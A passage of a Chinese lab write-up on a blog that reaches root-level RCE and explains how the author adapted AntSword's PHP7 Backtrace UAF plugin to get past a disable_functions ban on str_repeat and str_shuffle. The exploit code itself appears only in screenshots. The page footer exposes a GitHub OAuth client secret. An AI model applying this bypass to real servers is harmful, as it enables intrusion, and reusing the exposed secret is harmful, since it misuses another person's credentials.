+<p>加载魔改后的插件和对应的exp，点击开始：</p>
+<p><img src="/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231103205100914.png" alt="image-20231103205100914"></p>
+<p>跳转到root目录，执行getrceflag程序</p>
+<p><img src="/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231103205214990.png" alt="image-20231103205214990"></p>
+<p>获得第二个flag：</p>
+<p><mark>flag{RCE_2A7o4zrC2b9yviVp}</mark></p>
+<p>这个靶场到这儿就结束啦！！！下面就是插件魔改的详细过程。</p>
+<h2 id="二-魔改插件过程"><a class="markdownIt-Anchor" href="#二-魔改插件过程"></a> 二、魔改插件过程</h2>
+<h3 id="1被ban函数的位置以及确认exp"><a class="markdownIt-Anchor" href="#1被ban函数的位置以及确认exp"></a> ①：被ban函数的位置以及确认exp</h3>
+<p>首先确认php版本，加载插件：</p>
+<p><img src="/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231107025022272.png" alt="image-20231107025022272"></p>
+<p>php7.2，先大概锁定两个exp: <code>PHP7 Backtrace UAF</code> 和<code>PHP7 GC with Certain Destructors UAF</code></p>
+<p>正常点击开始并不能达到bypass的作用，再结合提示(hint)所说：</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">恭喜你成功RCE！</span><br><span class="line">现在你需要<span class="keyword">Bypass </span><span class="keyword">disable_function。</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line">本环境可使用某种现成的<span class="keyword">bypass </span>PoC，但是由于<span class="keyword">ban了某些函数，因此你需要自行对该PoC进行一些你力所能及的修改。</span></span><br><span class="line"><span class="keyword"></span>至于是哪种PoC，嘿嘿？</span><br></pre></td></tr></table></figure>
+<p>查看被ban掉的函数，在蚁剑的插件源码（位于antData\plugins\as_bypass_php_disable_functions-master\payload.js）中查找<strong>disable_function</strong>中下列函数</p>
+<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str_repeat,</span>str_shuffle</span><br></pre></td></tr></table></figure>
+<p>为什么仅排查这2个函数，其实对<strong>Bypass disable_function</strong>有一定查阅的师傅肯定能发现这2个函数之前的函数都是<strong>disable_function</strong>很常见的函数。</p>
+<p>在<strong>PHP7_Backtrace_UAF_EXP</strong>源码中找到</p>
+<p><mark><strong>str_repeat</strong></mark></p>
+<p><img src="/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231107030223250.png" alt="image-20231107030223250"></p>
+<p><img src="/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231107030300501.png" alt="image-20231107030300501"></p>
+<p><img src="/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231107030346773.png" alt="image-20231107030346773"></p>
+<p><mark><strong>str_shuffle</strong></mark></p>
+<p><img src="/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231107030529707.png" alt="image-20231107030529707"></p>
+<p>找到了被ban函数的位置和确认了exp，那么下一步就是如何魔改exp了。</p>
+<h3 id="2确认函数功能并手动实现"><a class="markdownIt-Anchor" href="#2确认函数功能并手动实现"></a> ②：确认函数功能并手动实现</h3>
+<p>第一步先确认两个函数的功能：</p>
+<p><code>str_repeat</code>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#定义和用法</span></span><br><span class="line"><span class="title function_ invoke__">str_repeat</span>() 函数把字符串重复指定的次数。</span><br><span class="line"><span class="comment">#语法</span></span><br><span class="line"><span class="title function_ invoke__">str_repeat</span>(<span class="keyword">string</span>,repeat)</span><br><span class="line"><span class="comment">#参数	   描述</span></span><br><span class="line"><span class="keyword">string</span>	必需。规定要重复的字符串。</span><br><span class="line">repeat	必需。规定字符串将被重复的次数。必须大于等于 <span class="number">0</span></span><br></pre></td></tr></table></figure>
+<p><code>str_shuffle</code>:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#定义和用法</span></span><br><span class="line"><span class="title function_ invoke__">str_shuffle</span>() 函数随机打乱字符串中的所有字符。</span><br><span class="line"><span class="comment">#语法</span></span><br><span class="line"><span class="title function_ invoke__">str_shuffle</span>(<span class="keyword">string</span>)</span><br><span class="line"><span class="comment">#参数	  描述</span></span><br><span class="line"><span class="keyword">string</span>	必需。规定要打乱的字符串。</span><br></pre></td></tr></table></figure>
+<p>确认了函数功能下面就是手动实现的过程了，<code>str_repeat()</code>就是一个循环就能替代，而<code>str_shuffle()</code>就是为了随机打乱<code>str_repeat('A', 79)</code>所生成的数，这里生成的为79个相同的A，打乱与否并不重要，所以<code>str_shuffle()</code>完全可以舍弃掉，那么接下啦就是手动实现<code>str_repeat()</code>的过程和结果啦：</p>
+<p><img src="/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231107033415836.png" alt="image-20231107033415836"></p>
+<p><img src="/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231107033340312.png" alt="image-20231107033340312"></p>
+<p><img src="/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231107033445350.png" alt="image-20231107033445350"></p>
+<p>保存之后重启蚁剑（antsword），加载PHP7_Backtrace_UAF_EXP插件</p>
+<p><img src="/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231107033803884.png" alt="image-20231107033803884"></p>
+<p>绕过<strong>disable_function</strong>，exp利用成功。到此本文就结束啦！</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F/" rel="tag"># 渗透</a>
+              <a href="/tags/web/" rel="tag"># web</a>
+              <a href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag"># 靶场</a>
+              <a href="/tags/bypass/" rel="tag"># bypass</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/08/Responder%E4%B8%8Eevil-winRM%E9%85%8D%E5%90%88%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95windows/" rel="prev" title="Responder与evil-winRM配合远程登录windows">
+                  <i class="fa fa-chevron-left"></i> Responder与evil-winRM配合远程登录windows
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">TWe1v3</span>
+</div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+      <span>站点总字数：</span>
+    <span title="站点总字数">293k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span>站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">4:26</span>
+  </span>
+</div>
+
+<div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+  本站访客数:<span id="busuanzi_value_site_uv"></span>
+</span>
+</div>
+
+    </div>
+  </footer>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.0/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/9.1.3/mermaid.min.js","integrity":"sha256-TIYL00Rhw/8WaoUhYTLX9SKIEFdXxg+yMWSLVUbhiLg="}}</script>
+  <script src="/js/third-party/tags/mermaid.js"></script>
+
+
+
+  
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">false</script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.16.0/katex.min.css" integrity="sha256-uik/hNqHWZldXh/0K35nqOSCff9F61/ZOFReqNOBgB0=" crossorigin="anonymous">
+  <script class="next-config" data-name="katex" type="application/json">{"copy_tex_js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.16.0/contrib/copy-tex.min.js","integrity":"sha256-Us54+rSGDSTvIhKKUs4kygE2ipA0RXpWWh0/zLqw3bs="}}</script>
+  <script src="/js/third-party/math/katex.js"></script>
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.7.2/gitalk.css" integrity="sha256-AJnUHL7dBv6PGaeyPQJcgQPDjt/Hn/PvYZde1iqfp8U=" crossorigin="anonymous">
+
+<script class="next-config" data-name="gitalk" type="application/json">{"enable":true,"github_id":"TWe1v3# GitHub repo owner","repo":"TWe1v3-Blogcomment","client_id":"b1f12cb0fd210a7f001b# GitHub Application Client ID","client_secret":"80355aa1b174d1926079780262cdc80f1ca96516","admin_user":"TWe1v3","distraction_free_mode":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token","language":"zh-CN","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.7.2/gitalk.min.js","integrity":"sha256-Pmj85ojLaPOWwRtlMJwmezB/Qg8BzvJp5eTzvXaYAfA="},"path_md5":"ffeb7c878f7c579f85b42fffe0441c36"}</script>
+<script src="/js/third-party/comments/gitalk.js"></script>
+
+
+<script src="/live2d-widget/autoload.js"></script>
+</body>
+</html>
